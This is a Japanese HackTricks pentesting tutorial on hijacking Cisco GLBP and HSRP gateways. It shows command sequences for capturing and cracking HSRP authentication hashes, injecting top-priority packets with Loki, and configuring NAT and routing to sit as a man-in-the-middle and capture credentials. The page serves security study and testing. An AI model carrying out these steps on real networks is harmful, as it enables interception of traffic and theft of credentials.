# GLBP & HSRP 攻撃

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>


## FHRPハイジャック概要

### FHRPの理解
First Hop Redundancy Protocol (FHRP)は、複数の物理ルーターを単一の仮想エンティティに組み合わせることで、ネットワークの回復力を保証するプロトコルスイートです。これにより、負荷分散と耐障害性が向上します。Cisco Systemsは、GLBPとHSRPという2つの注目すべきFHRPプロトコルを導入しました。

### GLBPプロトコルの詳細
Ciscoによって開発されたGLBP（Gateway Load Balancing Protocol）は、TCP/IPスタックの上で動作し、通信にUDPポート3222を使用します。GLBPグループ内のルーターは3秒ごとに「hello」パケットを送信します。10秒間これらのパケットがルーターから受信されない場合、そのルーターは故障していると判断されます。ただし、これらのタイマー設定は調整可能です。

### GLBPの動作と負荷分散
GLBPは、単一の仮想IPと複数の仮想MACアドレスを使用して、複数のルーター間で負荷を共有することを可能にします。グループ内の各ルーターはパケットの転送に参加します。GLBPはHSRP/VRRPと異なり、真の負荷分散を提供します。これには以下が含まれます：

- **ホスト依存：** ホストが同じAVF MACアドレスを受け取ることを保証し、NAT設定を維持します。
- **ラウンドロビン：** AVF MACアドレスが交互に配布されるデフォルトモードです。
- **重みベースのラウンドロビン：** 事前に定義された「Weight」メトリックに基づいて負荷をバランスします。

### GLBPドメインの役割と用語
- **AVG (Active Virtual Gateway)：** 主要なルーターで、他のルーターにMACアドレスを配布します。
- **AVF (Active Virtual Forwarder)：** ネットワークトラフィックを処理するルーターです。
- **GLBP Priority：** AVGを決定し、デフォルトは100で、範囲は1から255です。
- **GLBP Weight：** ルーターの負荷レベルを示し、手動またはObject Trackingを介して調整可能です。
- **GLBP Virtual IP Address：** 接続されたデバイスのデフォルトゲートウェイとして機能します。

通信のために、GLBPは予約されたマルチキャストアドレス224.0.0.102とUDPポート3222を使用します。3秒ごとに「hello」パケットが送信され、10秒以内にパケットが受信されない場合、ルーターは「死んだ」とマークされます。

### GLBP攻撃メカニズム
攻撃者は、最高の優先度値（255）を持つGLBPパケットを送信することで、主要なルーターになることができます。これにより、DoSまたはMITM攻撃が可能になり、トラフィックの傍受やリダイレクトが行えます。

### Lokiを使用したGLBP攻撃の実行
[Loki](https://github.com/raizo62/loki_on_kali)は、優先度と重みを255に設定したパケットを注入することでGLBP攻撃を実行できます。攻撃前のステップには、Wiresharkなどのツールを使用して仮想IPアドレス、認証の有無、ルーターの優先度値などの情報を収集することが含まれます。

攻撃手順：
1. プロミスキャスモードに切り替え、IPフォワーディングを有効にする。
2. ターゲットルーターを特定し、そのIPを取得する。
3. 無差別ARPを生成する。
4. AVGを偽装して悪意のあるGLBPパケットを注入する。
5. 攻撃者のネットワークインターフェースにGLBP仮想IPをミラーリングするセカンダリIPアドレスを割り当てる。
6. 完全なトラフィックの可視性のためにSNATを実装する。
7. 元のAVGルーターを通じてインターネットアクセスを継続するためにルーティングを調整する。

これらのステップに従うことで、攻撃者は「中間者」として位置づけられ、暗号化されていないデータや機密データを含むネットワークトラフィックを傍受し、分析することができます。

デモンストレーションのために、必要なコマンドスニペットは以下の通りです：
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
```markdown
トラフィックの監視と傍受は、net-creds.pyや類似のツールを使用して、侵害されたネットワークを通じて流れるデータをキャプチャして分析することで行うことができます。

### HSRPハイジャックの受動的説明とコマンド詳細

#### HSRP（Hot Standby Router/Redundancy Protocol）の概要
HSRPは、ネットワークゲートウェイの冗長性のために設計されたCisco独自のプロトコルです。複数の物理ルーターを単一の論理ユニットに設定し、共有IPアドレスを持たせることができます。この論理ユニットは、トラフィックを指示する責任を持つプライマリルーターによって管理されます。GLBPが優先度や重みのようなメトリクスを使用してロードバランシングを行うのに対し、HSRPはトラフィック管理のために単一のアクティブルーターに依存しています。

#### HSRPの役割と用語
- **HSRPアクティブルーター**: トラフィックフローを管理するゲートウェイとして機能するデバイス。
- **HSRPスタンバイルーター**: アクティブルーターが故障した場合に引き継ぐ準備ができているバックアップルーター。
- **HSRPグループ**: 単一の強固な仮想ルーターを形成するために協力するルーターのセット。
- **HSRP MACアドレス**: HSRP設定内の論理ルーターに割り当てられた仮想MACアドレス。
- **HSRP仮想IPアドレス**: 接続されたデバイスのデフォルトゲートウェイとして機能するHSRPグループの仮想IPアドレス。

#### HSRPのバージョン
HSRPにはHSRPv1とHSRPv2の2つのバージョンがあり、主にグループ容量、マルチキャストIPの使用、および仮想MACアドレス構造で異なります。プロトコルはサービス情報交換のために特定のマルチキャストIPアドレスを使用し、Helloパケットは3秒ごとに送信されます。10秒間パケットが受信されない場合、ルーターは非アクティブと見なされます。

#### HSRP攻撃メカニズム
HSRP攻撃は、最大優先値を注入することによってアクティブルーターの役割を強制的に引き継ぐことを含みます。これにより、Man-In-The-Middle（MITM）攻撃が発生する可能性があります。攻撃前の重要なステップには、Wiresharkを使用したトラフィック分析によるHSRP設定に関するデータの収集が含まれます。

#### HSRP認証をバイパスする手順
1. HSRPデータを含むネットワークトラフィックを.pcapファイルとして保存します。
```shell
tcpdump -w hsrp_traffic.pcap
```
2. hsrp2john.pyを使用して.pcapファイルからMD5ハッシュを抽出します。
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripperを使用してMD5ハッシュをクラックします。
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Lokiを使用したHSRPインジェクションの実行**

1. Lokiを起動してHSRPの広告を特定します。
2. ネットワークインターフェースをプロミスキャスモードに設定し、IPフォワーディングを有効にします。
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Lokiを使用して特定のルーターをターゲットにし、クラックされたHSRPパスワードを入力し、アクティブルーターを偽装するために必要な設定を行います。
4. アクティブルーターの役割を獲得した後、正当なトラフィックを傍受するためにネットワークインターフェースとIPテーブルを設定します。
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. 旧アクティブルーターを通じてトラフィックをルーティングするためにルーティングテーブルを変更します。
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. net-creds.pyまたは類似のユーティリティを使用して、傍受したトラフィックから認証情報をキャプチャします。
```shell
sudo python2 net-creds.py -i eth0
```

これらのステップを実行することで、攻撃者はGLBPハイジャックの手順と同様に、トラフィックを傍受し、操作する位置に置かれます。これは、HSRPのような冗長性プロトコルの脆弱性と、堅牢なセキュリティ対策の必要性を浮き彫りにしています。


# 参考文献
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**githubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
```
